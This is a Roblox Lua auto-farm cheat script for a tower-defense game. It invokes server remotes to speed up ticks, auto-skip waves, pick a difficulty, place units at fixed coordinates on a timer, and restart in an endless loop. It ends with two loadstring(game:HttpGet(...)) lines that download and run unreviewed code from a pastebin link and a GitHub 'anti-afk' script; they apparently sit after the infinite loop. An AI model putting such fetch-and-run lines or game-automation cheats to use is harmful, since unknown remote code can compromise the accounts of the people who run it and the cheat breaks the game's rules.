local Players = game:GetService("Players")
local plr = Players.LocalPlayer

print(plr.Name .. " is running 3x Speed Auto Farm Script")

local rs = game:GetService("ReplicatedStorage")
local remotes = rs:WaitForChild("RemoteFunctions")

task.delay(2, function()
    pcall(function()
        remotes.ToggleAutoSkip:InvokeServer(true)
        warn("[System] Auto Skip Enabled")
    end)
end)

warn("[System] Loaded 3x Speed Script")
remotes.ChangeTickSpeed:InvokeServer(3)

local difficulty = "dif_impossible"
local placements = {
    {
        time = 23, unit = "unit_lawnmower", slot = "1",
        data = {Valid=true,PathIndex=3,Position=Vector3.new(-843.87384,62.1803055,-123.052032),
            DistanceAlongPath=248.0065,
            CF=CFrame.new(-843.87384,62.1803055,-123.052032,-0,0,1,0,1,-0,-1,0,-0),
            Rotation=180}
    },
    {
        time = 27, unit = "unit_rafflesia", slot = "2",
        data = {
            Valid = true,
            PathIndex = 3,
            Position = Vector3.new(-842.3812866210938, 62.18030548095703, -166.96620178222656),
            DistanceAlongPath = 175.5855255126953,
            Rotation = 180,
            CF = CFrame.new(-842.3812866210938, 62.18030548095703, -166.96620178222656, 1, 0, -0, -0, 1, -0, -0, 0, 1)
        }
    },
    {
        time = 35, unit = "unit_rafflesia", slot = "2",
        data = {
            Valid = true,
            PathIndex = 1,
            Position = Vector3.new(-767.0631713867188, 62.18004608154297, -225.05203247070312),
            DistanceAlongPath = 3.932219044727553,
            Rotation = 180,
            CF = CFrame.new(-767.0631713867188, 62.18004608154297, -225.05203247070312, -0, -0, -1, -0, 1, -0, 1, 0, -0)
        }
    },
    {
        time = 50, unit = "unit_rafflesia", slot = "2",
        data = {
            Valid = true,
            PathIndex = 3,
            Position = Vector3.new(-842.3812866210938, 62.18030548095703, -165.13092041015625),
            DistanceAlongPath = 177.42080688476562,
            Rotation = 180,
            CF = CFrame.new(-842.3812866210938, 62.18030548095703, -165.13092041015625, 1, 0, -0, -0, 1, -0, -0, 0, 1)
        }
    },
    {
        time = 75, unit = "unit_rafflesia", slot = "2",
        data = {
            Valid = true,
            PathIndex = 2,
            Position = Vector3.new(-883.3809814453125, 62.18030548095703, -215.8257598876953),
            DistanceAlongPath = 65.22627258300781,
            Rotation = 180,
            CF = CFrame.new(-883.3809814453125, 62.18030548095703, -215.8257598876953, 1, 0, -0, -0, 1, -0, -0, 0, 1)
        }
    }
}

local function placeUnit(unitName, slot, data)
    remotes.PlaceUnit:InvokeServer(unitName, data)
    warn("[Placing] "..unitName.." at "..os.clock())
end

local function startGame()
    remotes.PlaceDifficultyVote:InvokeServer(difficulty)
    for _, p in ipairs(placements) do
        task.delay(p.time, function()
            placeUnit(p.unit, p.slot, p.data)
        end)
    end
end

while true do
    startGame()
    task.wait(128)
    remotes.RestartGame:InvokeServer()
end

loadstring(game:HttpGet("https://pastebin.com/raw/HkAmPckQ"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()